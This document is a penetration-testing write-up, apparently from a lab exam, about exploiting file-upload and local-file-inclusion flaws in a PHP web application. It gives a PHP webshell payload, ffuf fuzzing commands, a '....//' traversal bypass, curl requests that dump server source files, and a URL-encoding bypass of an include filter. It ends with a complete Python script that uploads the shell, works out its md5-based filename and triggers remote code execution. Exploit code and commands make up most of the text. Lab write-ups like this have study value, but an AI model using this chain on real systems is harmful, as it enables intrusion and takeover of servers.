# Exam pentest File inclusions

In the form submission we uploaded following php file:
```php
<?php
    $content = '<?php system($_GET["cmd"]); ?>';
    file_put_contents('/var/www/html/shell.php', $content);
?>
```
On execution this places a webshell in the webroot reachable via `/shell.php`.. Commands are injected via the query param `cmd`
Not sure where that file is stored yet.
After submission the url reveals a query param
```
http://94.237.58.137:54293/thanks.php?n=koen
```
Looked into it for LFI exploits but did not find any.. Looking at the page source code I found it loads a page with a call to a php file:
```
http://94.237.58.137:54293/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c
```

Tried fuzzing the parameter `p` for LFI vunerabilities and found it is vunerable:
```
ffuf -w /snap/seclists/current/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.58.137:54293/api/image.php?p=FUZZ'
```
For instance following path injection works
```
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
```

Now let's try fuzzing to find the web root so we can find the uploaded webshell image:
```
ffuf -w /snap/seclists/current/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://94.237.58.137:54293/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//FUZZ/index.php'
```
We found a hit for `var/www/html/`

Let's try dumping the content of a few php scripts of interest...


```
curl http://94.237.58.137:54293/api/image.php?p=....//....//....//....//var/www/html/api/application.php
````
The content of `application.php` is:
```php
<?php
$firstName = $_POST["firstName"];
$lastName = $_POST["lastName"];
$email = $_POST["email"];
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);

header("Location: /thanks.php?n=" . urlencode($firstName));
```


The content of `image.php` obtained via:
```
curl http://94.237.58.137:54293/api/image.php?p=....//....//....//....//var/www/html/api/image.php
````

```php
<?php
if (isset($_GET["p"])) {
    $path = "../images/" . str_replace("../", "", $_GET["p"]);
    $contents = file_get_contents($path);
    header("Content-Type: image/jpeg");
    echo $contents;
}
````

The content of `contact.php` obtained via:
````
curl http://94.237.58.137:54293/api/image.php?p=....//....//....//....//var/www/html/contact.php
````
```php
<html>
    <head>
        <title>&lt;sumace/></title>
        <link rel="stylesheet" href="https://unpkg.com/mvp.css">
        <link rel="stylesheet" href="/css/custom.css">
    </head>
    <body>
        <header>
            <nav>
                <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="30"/></a>
                <ul>
                    <li><a href="/">Home</a></li>
                    <li>Contact</li>
                    <li><a href="/apply.php">Apply</a></li>
                </ul>
            </nav>  
            <section>
                <header>
                    <h1>Contact us.</h1>
                    <p>Give us a call. <mark>We will sort it out</mark>.</p>
                </header>
                <p>
                    <?php
                    $region = "AT";
                    $danger = false;

                    if (isset($_GET["region"])) {
                        if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
                            echo "'region' parameter contains invalid character(s)";
                            $danger = true;
                        } else {
                            $region = urldecode($_GET["region"]);
                        }
                    }

                    if (!$danger) {
                        include "./regions/" . $region . ".php";
                    }
                    ?>
                </p>
            </section>
            </header>
        <footer>
            <hr>
            <p>
                <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="25"/></a><br>
                Sumace Consulting Gmbh<br>
                Rasumofskygasse 23/25, 1030 Wien<br>
                +43 670 8872 958<br>
            </p>
        </footer>
    </body>
</html>
```

We can see when a file is uploaded the md5hash of the content of the file is taken to compute the filename.
We have uploaded this `shell.php`:
```
<?php system($_GET["cmd"]); ?>
```

So we can compute the filename of our uploaded shell with:
```
md5sum shell.php
```
The output is `fc023fcacb27a7ad72d605c4e300b389`, meaning the path to the uploaded shell should be:
```
/var/www/html/uploads/fc023fcacb27a7ad72d605c4e300b389.php
```
We can verify this with:
```
curl http://94.237.58.137:54293/api/image.php?p=....//....//....//....//var/www/html/uploads/fc023fcacb27a7ad72d605c4e300b389.php
```
Sure enough we see the shell printed in the terminal...
As we can see the current LFI exploit in the `image.php` script does not give us RCE as the `file_get_contents` function is used. However we see a potential RCE in `contact.php`. The script runs a query param with an 
include statement which gives us RCE.. However it performes some basic filtering where if the `.` or `/` charachters are detected it skips the include. We can bypass this by urlencodig these charachters as they are url decoded later in the script after the filter checks for illegal charachters.

This won't work...
```
curl http://94.237.58.137:54293/api/contact.php?region=../../../../../../var/www/html/uploads/fc023fcacb27a7ad72d605c4e300b389
```
But if we url encode it it will bypass the filter:
```
curl http://94.237.58.137:54293/api/contact.php?region=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fvar%2Fwww%2Fhtml%2Fuploads%2Ffc023fcacb27a7ad72d605c4e300b389
```
Not the script we uploaded got executed... and we have a webshell running...

I wrote a python script to automate this exploit:
```python
import requests
import hashlib
from urllib.parse import urlencode

IP_ADDRESS = 'http://94.237.61.248:54916'
PAYLOAD_FILENAME = 'write_a_webshell.php'

def upload_payload():
    headers = {
        "User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                        "AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/143.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Origin": IP_ADDRESS,
        "Referer": f"{IP_ADDRESS}/apply.php",
    }
    data = {
        'firstName':'Koen', 
        'lastName': 'Van den Maegdenbergh',
        'email': 'koen@abc.com',
        'notes': 'some text'
    }
    files = {
        'file':(
            PAYLOAD_FILENAME, 
            open(PAYLOAD_FILENAME, 'rb'), 
            'application/pdf'
        )
    }
    response = requests.post(f'{IP_ADDRESS}/api/application.php', data=data, files=files, headers=headers, verify=False)
    if response.status_code != 200:
        raise 'Failed to upload exploit'
    print('Payload uploaded...')


def calc_md5_sum() -> str:
    return hashlib.md5(
        open(PAYLOAD_FILENAME, "r").read().encode()
    ).hexdigest()

def check_if_file_exists(filepath):
    response = requests.get(f'{IP_ADDRESS}/api/image.php?p=....//....//....//..../{filepath}')
    if not(response.status_code == 200 and len(response.content) > 0):
        raise ValueError('Payloaded was not uploaded successfully')
    return True

def check_if_payload_uploaded_ok():
    md5_sum = calc_md5_sum()
    filepath = f'/var/www/html/uploads/{md5_sum}.php'
    check_if_file_exists(filepath)
    print(f'Successfully found the location of the payload')

def run_first_stage():
    md5_sum = calc_md5_sum()
    lfi_hack = f'../../../../../../var/www/html/uploads/{md5_sum}'
    lfi_hack= lfi_hack.replace('.', '%2E') 
    lfi_hack= lfi_hack.replace('/', '%2F')
    response = requests.get(f'{IP_ADDRESS}/contact.php', params={'region':lfi_hack})
    if response.status_code != 200:
        raise ValueError('Failed too run payload')
    check_if_file_exists('/var/www/html/shell.php')
    print(f'Shell has been placed at {IP_ADDRESS}/shell.php?cmd=id')


upload_payload()
check_if_payload_uploaded_ok()
run_first_stage()
```
